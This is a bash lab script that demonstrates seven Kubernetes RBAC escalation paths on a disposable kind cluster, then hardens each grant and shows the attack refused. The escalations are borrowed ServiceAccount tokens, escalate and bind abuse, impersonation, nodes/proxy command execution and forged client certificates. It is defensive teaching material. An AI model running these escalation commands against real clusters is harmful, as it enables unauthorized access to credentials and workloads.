#!/usr/bin/env bash
# Lab 05.01: RBAC escalation paths. Tier A (kind).
#
# Run this ONLY against a kind cluster you own, from any directory. It creates
# one namespace, p05-rbac, and a few cluster-scoped objects whose names start
# with p05-, and it deletes all of them at the end. Seven identities each hold
# one over-broad grant. Each grant is used to reach a Secret or to act as
# another identity. The grant is then removed, or narrowed, and the same step
# is refused.
#
# Every attack goes through the API server, except the nodes/proxy path, which
# reaches the kubelet on the kind node. The kubelet runs inside the kind node
# container, which shares the host kernel. Nothing here touches the machine that
# runs kind, or any container other than the lab's own Pods.
#
# The attack manifests are deliberately insecure, and they live only in p05-rbac.
# Secret values are dummies. Tokens are kept in files and never printed.
set +e

# busybox:1.36, pinned by digest (the image 05.02 uses).
BB=busybox@sha256:73aaf090f3d85aa34ee199857f03fa3a95c8ede2ffd4cc2cdb5b94e566b11662
# The borrowing Pods need a client that completes TLS with the API server.
# busybox wget fails that handshake here (alert 47), so they use curl. This
# digest is the one the lab host already holds; its tag is not recorded there,
# and the Pod logs print `curl --version` so the transcript says which curl ran.
CURLIMG=curlimages/curl@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777
NS=p05-rbac

# Read a command from stdin, print it exactly as it runs, then run it.
run() { local cmd; cmd=$(cat); printf '$ %s\n' "$cmd"; eval "$cmd" 2>&1; echo; }

ctx=$(kubectl config current-context 2>/dev/null)
case "$ctx" in
  kind-*) ;;
  *) echo "refusing to run: kubectl context '$ctx' is not a kind cluster" >&2; exit 2 ;;
esac

work=$(mktemp -d) && cd "$work" || exit 1

# Leftovers from an earlier run.
kubectl delete ns "$NS" --ignore-not-found --wait=true >/dev/null 2>&1
kubectl delete clusterrolebinding p05-node-proxy p05-csr-approver --ignore-not-found >/dev/null 2>&1
kubectl delete clusterrole p05-node-proxy p05-csr-approver --ignore-not-found >/dev/null 2>&1
kubectl delete csr p05-impostor-csr p05-impostor2-csr --ignore-not-found >/dev/null 2>&1

echo '## step 1: a namespace, a victim that holds a Secret in its environment, and seven identities with broad grants'
run <<'CMD'
kubectl create ns p05-rbac
kubectl label ns p05-rbac pod-security.kubernetes.io/enforce=baseline
CMD
until kubectl get sa default -n p05-rbac >/dev/null 2>&1; do sleep 1; done
run <<'CMD'
kubectl -n p05-rbac create secret generic p05-db-creds --from-literal=password=p05-lab-only-password
kubectl -n p05-rbac create secret generic p05-app-creds --from-literal=token=p05-lab-only-token
CMD

cat > setup.yaml <<'YAML'
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-web, namespace: p05-rbac}
automountServiceAccountToken: false
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-deployer, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-dev, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-author, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-binder, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-impersonator, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-lister, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-node, namespace: p05-rbac}
---
apiVersion: v1
kind: ServiceAccount
metadata: {name: p05-approver, namespace: p05-rbac}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-dev, namespace: p05-rbac}
rules:
  - {apiGroups: [""], resources: ["pods"], verbs: ["*"]}
  - {apiGroups: [""], resources: ["pods/log"], verbs: ["get"]}
  - {apiGroups: ["apps"], resources: ["deployments"], verbs: ["create", "get", "list"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-dev, namespace: p05-rbac}
subjects: [{kind: ServiceAccount, name: p05-dev, namespace: p05-rbac}]
roleRef: {kind: Role, name: p05-dev, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-db-reader, namespace: p05-rbac}
rules:
  - {apiGroups: [""], resources: ["secrets"], resourceNames: ["p05-db-creds"], verbs: ["get"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-deployer-db, namespace: p05-rbac}
subjects: [{kind: ServiceAccount, name: p05-deployer, namespace: p05-rbac}]
roleRef: {kind: Role, name: p05-db-reader, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-readers-db, namespace: p05-rbac}
subjects: [{kind: Group, name: p05-readers, apiGroup: rbac.authorization.k8s.io}]
roleRef: {kind: Role, name: p05-db-reader, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-author, namespace: p05-rbac}
rules:
  - {apiGroups: ["rbac.authorization.k8s.io"], resources: ["roles"], resourceNames: ["p05-author"], verbs: ["get", "update", "patch", "escalate"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-author, namespace: p05-rbac}
subjects: [{kind: ServiceAccount, name: p05-author, namespace: p05-rbac}]
roleRef: {kind: Role, name: p05-author, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-binder, namespace: p05-rbac}
rules:
  - {apiGroups: ["rbac.authorization.k8s.io"], resources: ["rolebindings"], verbs: ["create", "get"]}
  - {apiGroups: ["rbac.authorization.k8s.io"], resources: ["clusterroles"], resourceNames: ["edit"], verbs: ["bind"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-binder, namespace: p05-rbac}
subjects: [{kind: ServiceAccount, name: p05-binder, namespace: p05-rbac}]
roleRef: {kind: Role, name: p05-binder, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-impersonator, namespace: p05-rbac}
rules:
  - {apiGroups: [""], resources: ["serviceaccounts"], resourceNames: ["p05-deployer"], verbs: ["impersonate"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-impersonator, namespace: p05-rbac}
subjects: [{kind: ServiceAccount, name: p05-impersonator, namespace: p05-rbac}]
roleRef: {kind: Role, name: p05-impersonator, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-lister, namespace: p05-rbac}
rules:
  - {apiGroups: [""], resources: ["secrets"], verbs: ["list"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata: {name: p05-lister, namespace: p05-rbac}
subjects: [{kind: ServiceAccount, name: p05-lister, namespace: p05-rbac}]
roleRef: {kind: Role, name: p05-lister, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: {name: p05-node-proxy}
rules:
  - {apiGroups: [""], resources: ["nodes/proxy"], verbs: ["get", "create"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: {name: p05-node-proxy}
subjects: [{kind: ServiceAccount, name: p05-node, namespace: p05-rbac}]
roleRef: {kind: ClusterRole, name: p05-node-proxy, apiGroup: rbac.authorization.k8s.io}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: {name: p05-csr-approver}
rules:
  - {apiGroups: ["certificates.k8s.io"], resources: ["certificatesigningrequests"], verbs: ["create", "get", "list"]}
  - {apiGroups: ["certificates.k8s.io"], resources: ["certificatesigningrequests/approval"], verbs: ["update"]}
  - {apiGroups: ["certificates.k8s.io"], resources: ["signers"], resourceNames: ["kubernetes.io/kube-apiserver-client"], verbs: ["approve"]}
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: {name: p05-csr-approver}
subjects: [{kind: ServiceAccount, name: p05-approver, namespace: p05-rbac}]
roleRef: {kind: ClusterRole, name: p05-csr-approver, apiGroup: rbac.authorization.k8s.io}
YAML
run <<'CMD'
kubectl apply -f setup.yaml
CMD

cat > victim.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata: {name: p05-victim, namespace: p05-rbac}
spec:
  serviceAccountName: p05-web
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 65532
    runAsGroup: 65532
    seccompProfile: {type: RuntimeDefault}
  containers:
    - name: app
      image: IMAGE
      command: ["sleep", "3600"]
      env:
        - name: DB_PASSWORD
          valueFrom: {secretKeyRef: {name: p05-db-creds, key: password}}
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities: {drop: ["ALL"]}
      resources:
        requests: {cpu: 10m, memory: 16Mi}
        limits: {memory: 32Mi}
      volumeMounts:
        - {name: tmp, mountPath: /tmp}
  volumes:
    - {name: tmp, emptyDir: {}}
YAML
sed -i.bak "s|IMAGE|$BB|" victim.yaml

run <<'CMD'
kubectl apply -f victim.yaml
kubectl wait -n p05-rbac --for=condition=Ready pod/p05-victim --timeout=120s
CMD

# One kubeconfig per attacker: the cluster and its CA, and only that token.
kubectl config view --minify --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' | base64 -d > ca.crt
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
NODE=$(kubectl get nodes -o jsonpath='{.items[0].metadata.name}')
mkkc() {
  kubectl --kubeconfig="$1.kubeconfig" config set-cluster lab --server="$SERVER" --certificate-authority=ca.crt --embed-certs=true >/dev/null
  kubectl --kubeconfig="$1.kubeconfig" config set-credentials "$1" --token="$2" >/dev/null
  kubectl --kubeconfig="$1.kubeconfig" config set-context lab --cluster=lab --user="$1" >/dev/null
  kubectl --kubeconfig="$1.kubeconfig" config use-context lab >/dev/null
}
for id in dev author binder impersonator node lister approver; do
  mkkc "$id" "$(kubectl create token "p05-$id" -n "$NS" --duration=1h)"
done
TOK_NODE=$(kubectl create token p05-node -n "$NS" --duration=1h)
sleep 2

run <<'CMD'
kubectl --kubeconfig dev.kubeconfig auth whoami | grep Username
CMD

# ---------------------------------------------------------------- path A

cat > borrow-pod.yaml <<'YAML'
# INSECURE ON PURPOSE: a Pod that runs as the p05-deployer ServiceAccount and reads a Secret with its token. Lab cluster only.
apiVersion: v1
kind: Pod
metadata: {name: p05-borrow, namespace: p05-rbac}
spec:
  serviceAccountName: p05-deployer
  containers:
    - name: borrow
      image: IMAGE
      command: ["sh", "-c"]
      args:
        - |
          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          curl --version | head -1
          curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
            -H "Authorization: Bearer $T" \
            https://kubernetes.default.svc/api/v1/namespaces/p05-rbac/secrets/p05-db-creds \
            | sed -n 's/.*"password": *"\([^"]*\)".*/\1/p' | base64 -d; echo
          sleep 3600
YAML
sed -i.bak "s|IMAGE|$CURLIMG|" borrow-pod.yaml

cat > borrow-deploy.yaml <<'YAML'
# INSECURE ON PURPOSE: a Deployment whose pod template names the p05-deployer ServiceAccount. The controller creates the Pod, so the creator never needs pods create. Lab cluster only.
apiVersion: apps/v1
kind: Deployment
metadata: {name: p05-borrow-deploy, namespace: p05-rbac}
spec:
  replicas: 1
  selector:
    matchLabels: {app: p05-borrow-deploy}
  template:
    metadata:
      labels: {app: p05-borrow-deploy}
    spec:
      serviceAccountName: p05-deployer
      containers:
        - name: borrow
          image: IMAGE
          command: ["sh", "-c"]
          args:
            - |
              T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
              curl --version | head -1
              curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
                -H "Authorization: Bearer $T" \
                https://kubernetes.default.svc/api/v1/namespaces/p05-rbac/secrets/p05-db-creds \
                | sed -n 's/.*"password": *"\([^"]*\)".*/\1/p' | base64 -d; echo
              sleep 3600
YAML
sed -i.bak "s|IMAGE|$CURLIMG|" borrow-deploy.yaml

echo '## path A, step 2: the dev identity may create Pods, and may read Secrets only if it is granted them'
run <<'CMD'
kubectl --kubeconfig dev.kubeconfig auth can-i create pods -n p05-rbac
kubectl --kubeconfig dev.kubeconfig auth can-i get secrets -n p05-rbac
kubectl --kubeconfig dev.kubeconfig get secret p05-db-creds -n p05-rbac
CMD

echo '## path A, step 3: a Pod names the p05-deployer ServiceAccount and reads the Secret with the token the kubelet mounts'
run <<'CMD'
kubectl --kubeconfig dev.kubeconfig apply -f borrow-pod.yaml
kubectl --kubeconfig dev.kubeconfig wait -n p05-rbac --for=condition=Ready pod/p05-borrow --timeout=120s
kubectl --kubeconfig dev.kubeconfig logs -n p05-rbac p05-borrow
CMD

echo '## path A, step 4: the same escape without a Pod: a Deployment, whose controller creates the Pod'
run <<'CMD'
kubectl --kubeconfig dev.kubeconfig create -f borrow-deploy.yaml
kubectl wait -n p05-rbac --for=condition=Available deployment/p05-borrow-deploy --timeout=120s
kubectl --kubeconfig dev.kubeconfig logs -n p05-rbac deployment/p05-borrow-deploy
CMD

echo '## path A, harden: the dev identity reads Pods and Deployments, and creates neither'
run <<'CMD'
kubectl -n p05-rbac delete pod p05-borrow --ignore-not-found
kubectl -n p05-rbac delete deployment p05-borrow-deploy --ignore-not-found
CMD
cat > dev-hardened.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-dev, namespace: p05-rbac}
rules:
  - {apiGroups: [""], resources: ["pods"], verbs: ["get", "list", "watch"]}
  - {apiGroups: [""], resources: ["pods/log"], verbs: ["get"]}
  - {apiGroups: ["apps"], resources: ["deployments"], verbs: ["get", "list"]}
YAML
run <<'CMD'
kubectl apply -f dev-hardened.yaml
CMD
sleep 2

echo '## path A, re-attack: both the direct Pod and the Deployment are refused'
run <<'CMD'
kubectl --kubeconfig dev.kubeconfig create -f borrow-pod.yaml
kubectl --kubeconfig dev.kubeconfig create -f borrow-deploy.yaml
CMD

# ---------------------------------------------------------------- path B

echo '## path B, step 5: the author identity may update its own Role, and that is all it can do with Secrets'
run <<'CMD'
kubectl --kubeconfig author.kubeconfig auth can-i get secrets -n p05-rbac
kubectl --kubeconfig author.kubeconfig auth can-i escalate roles/p05-author -n p05-rbac
kubectl --kubeconfig author.kubeconfig patch role p05-author -n p05-rbac --type=json -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":[""],"resources":["secrets"],"resourceNames":["p05-db-creds"],"verbs":["get"]}}]'
kubectl --kubeconfig author.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
CMD

echo '## path B, harden 1: remove escalate, keep update and patch; the same patch is refused'
cat > author-step1.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-author, namespace: p05-rbac}
rules:
  - {apiGroups: ["rbac.authorization.k8s.io"], resources: ["roles"], resourceNames: ["p05-author"], verbs: ["get", "update", "patch"]}
YAML
run <<'CMD'
kubectl apply -f author-step1.yaml
CMD
sleep 2
run <<'CMD'
kubectl --kubeconfig author.kubeconfig patch role p05-author -n p05-rbac --type=json -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":[""],"resources":["secrets"],"resourceNames":["p05-db-creds"],"verbs":["get"]}}]'
CMD

echo '## path B, harden 2: remove update and patch as well; a Role the identity cannot edit cannot be widened'
cat > author-step2.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-author, namespace: p05-rbac}
rules:
  - {apiGroups: ["rbac.authorization.k8s.io"], resources: ["roles"], resourceNames: ["p05-author"], verbs: ["get"]}
YAML
run <<'CMD'
kubectl apply -f author-step2.yaml
CMD
sleep 2
run <<'CMD'
kubectl --kubeconfig author.kubeconfig patch role p05-author -n p05-rbac --type=json -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":[""],"resources":["secrets"],"resourceNames":["p05-db-creds"],"verbs":["get"]}}]'
kubectl --kubeconfig author.kubeconfig get secret p05-db-creds -n p05-rbac
CMD

# ---------------------------------------------------------------- path C

echo '## path C, step 6: the binder identity creates a RoleBinding to the built-in edit ClusterRole, which it does not hold'
run <<'CMD'
kubectl --kubeconfig binder.kubeconfig auth can-i get secrets -n p05-rbac
kubectl --kubeconfig binder.kubeconfig create rolebinding p05-grab -n p05-rbac --clusterrole=edit --serviceaccount=p05-rbac:p05-binder
kubectl --kubeconfig binder.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
CMD

echo '## path C, harden: remove the binding the attack left, and remove bind; a new binding to edit is refused'
run <<'CMD'
kubectl -n p05-rbac delete rolebinding p05-grab --ignore-not-found
CMD
cat > binder-hardened.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-binder, namespace: p05-rbac}
rules:
  - {apiGroups: ["rbac.authorization.k8s.io"], resources: ["rolebindings"], verbs: ["create", "get"]}
YAML
run <<'CMD'
kubectl apply -f binder-hardened.yaml
CMD
sleep 2
run <<'CMD'
kubectl --kubeconfig binder.kubeconfig create rolebinding p05-grab -n p05-rbac --clusterrole=edit --serviceaccount=p05-rbac:p05-binder
CMD

# ---------------------------------------------------------------- path D

echo '## path D, step 7: the impersonator identity reads the Secret as the p05-deployer ServiceAccount'
run <<'CMD'
kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac
kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac --as=system:serviceaccount:p05-rbac:p05-deployer -o jsonpath='{.data.password}' | base64 -d; echo
CMD
run <<'CMD'
kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac --as=system:serviceaccount:p05-rbac:p05-web
CMD

echo '## path D, harden: remove the grant; the same impersonation is refused'
run <<'CMD'
kubectl -n p05-rbac delete rolebinding p05-impersonator
sleep 2
kubectl --kubeconfig impersonator.kubeconfig get secret p05-db-creds -n p05-rbac --as=system:serviceaccount:p05-rbac:p05-deployer
CMD

# ---------------------------------------------------------------- path E

echo '## path E, step 8: the node identity reads kubelet state and runs a command in the victim Pod, with no pods/exec and no secrets'
run <<'CMD'
kubectl --kubeconfig node.kubeconfig auth can-i get nodes --subresource=proxy
kubectl --kubeconfig node.kubeconfig auth can-i create pods --subresource=exec -n p05-rbac
kubectl --kubeconfig node.kubeconfig get --raw "/api/v1/nodes/$NODE/proxy/pods" | grep -o '"namespace":"[^"]*"' | wc -l
CMD
run <<'CMD'
curl -s --cacert ca.crt -H "Authorization: Bearer $TOK_NODE" -X POST "$SERVER/api/v1/nodes/$NODE/proxy/run/p05-rbac/p05-victim/app?cmd=env" | grep DB_PASSWORD
CMD

echo '## path E, harden: nodes get and list for a dashboard, and no proxy; both kubelet calls are refused'
cat > node-hardened.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: {name: p05-node-proxy}
rules:
  - {apiGroups: [""], resources: ["nodes"], verbs: ["get", "list"]}
YAML
run <<'CMD'
kubectl apply -f node-hardened.yaml
CMD
sleep 2
run <<'CMD'
kubectl --kubeconfig node.kubeconfig get --raw "/api/v1/nodes/$NODE/proxy/pods"
curl -s --cacert ca.crt -H "Authorization: Bearer $TOK_NODE" -X POST "$SERVER/api/v1/nodes/$NODE/proxy/run/p05-rbac/p05-victim/app?cmd=env" | grep -E 'DB_PASSWORD|forbidden'
CMD

# ---------------------------------------------------------------- path F

echo '## path F, step 9: the lister identity reads every Secret in the namespace, values included'
run <<'CMD'
kubectl --kubeconfig lister.kubeconfig auth can-i get secrets -n p05-rbac
kubectl --kubeconfig lister.kubeconfig get secrets -n p05-rbac -o go-template='{{range .items}}{{.metadata.name}} {{range $k, $v := .data}}{{$k}}={{$v | base64decode}} {{end}}{{"\n"}}{{end}}'
CMD

echo '## path F, harden: name the one Secret the reader needs, with get; list is removed'
cat > lister-hardened.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: {name: p05-lister, namespace: p05-rbac}
rules:
  - {apiGroups: [""], resources: ["secrets"], resourceNames: ["p05-app-creds"], verbs: ["get"]}
YAML
run <<'CMD'
kubectl apply -f lister-hardened.yaml
CMD
sleep 2
run <<'CMD'
kubectl --kubeconfig lister.kubeconfig get secrets -n p05-rbac
kubectl --kubeconfig lister.kubeconfig get secret p05-db-creds -n p05-rbac
kubectl --kubeconfig lister.kubeconfig get secret p05-app-creds -n p05-rbac -o jsonpath='{.data.token}' | base64 -d; echo
CMD

# ---------------------------------------------------------------- path G

echo '## path G, step 10: the approver identity files a CSR for group p05-readers, approves it, and uses the certificate'
run <<'CMD'
kubectl --kubeconfig approver.kubeconfig auth can-i create certificatesigningrequests
openssl genrsa -out impostor.key 2048 2>/dev/null
openssl req -new -key impostor.key -subj "/CN=p05-impostor/O=p05-readers" -out impostor.csr
CMD
REQ=$(base64 < impostor.csr | tr -d '\n')
cat > impostor-csr.yaml <<YAML
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: {name: p05-impostor-csr}
spec:
  request: $REQ
  signerName: kubernetes.io/kube-apiserver-client
  usages: ["client auth"]
  expirationSeconds: 900
YAML
run <<'CMD'
kubectl --kubeconfig approver.kubeconfig apply -f impostor-csr.yaml
kubectl --kubeconfig approver.kubeconfig certificate approve p05-impostor-csr
CMD
until [ -n "$(kubectl get csr p05-impostor-csr -o jsonpath='{.status.certificate}' 2>/dev/null)" ]; do sleep 1; done
kubectl get csr p05-impostor-csr -o jsonpath='{.status.certificate}' | base64 -d > impostor.crt
kubectl --kubeconfig=impostor.kubeconfig config set-cluster lab --server="$SERVER" --certificate-authority=ca.crt --embed-certs=true >/dev/null
kubectl --kubeconfig=impostor.kubeconfig config set-credentials p05-impostor --client-certificate=impostor.crt --client-key=impostor.key --embed-certs=true >/dev/null
kubectl --kubeconfig=impostor.kubeconfig config set-context lab --cluster=lab --user=p05-impostor >/dev/null
kubectl --kubeconfig=impostor.kubeconfig config use-context lab >/dev/null
run <<'CMD'
openssl x509 -in impostor.crt -noout -subject -enddate
kubectl --kubeconfig impostor.kubeconfig auth whoami | grep -E 'Username|Groups'
kubectl --kubeconfig impostor.kubeconfig get secret p05-db-creds -n p05-rbac -o jsonpath='{.data.password}' | base64 -d; echo
CMD

echo '## path G, harden: remove the signers grant; the approver can still file a CSR, but it cannot approve one'
run <<'CMD'
kubectl --kubeconfig approver.kubeconfig auth can-i create certificatesigningrequests
CMD
cat > approver-hardened.yaml <<'YAML'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: {name: p05-csr-approver}
rules:
  - {apiGroups: ["certificates.k8s.io"], resources: ["certificatesigningrequests"], verbs: ["create", "get", "list"]}
  - {apiGroups: ["certificates.k8s.io"], resources: ["certificatesigningrequests/approval"], verbs: ["update"]}
YAML
run <<'CMD'
kubectl apply -f approver-hardened.yaml
CMD
sleep 2
sed 's/p05-impostor-csr/p05-impostor2-csr/' impostor-csr.yaml > impostor2-csr.yaml
run <<'CMD'
kubectl --kubeconfig approver.kubeconfig apply -f impostor2-csr.yaml
kubectl --kubeconfig approver.kubeconfig certificate approve p05-impostor2-csr
CMD

# ---------------------------------------------------------------- teardown

echo '## step 11: tear down what the lab created'
run <<'CMD'
kubectl delete ns p05-rbac --wait=true
kubectl delete clusterrolebinding p05-node-proxy p05-csr-approver --ignore-not-found
kubectl delete clusterrole p05-node-proxy p05-csr-approver --ignore-not-found
kubectl delete csr p05-impostor-csr p05-impostor2-csr --ignore-not-found
kubectl get clusterrole,clusterrolebinding,csr p05-node-proxy p05-csr-approver p05-impostor-csr p05-impostor2-csr --ignore-not-found
echo 'no lab-owned cluster objects left'
CMD
rm -rf "$work"
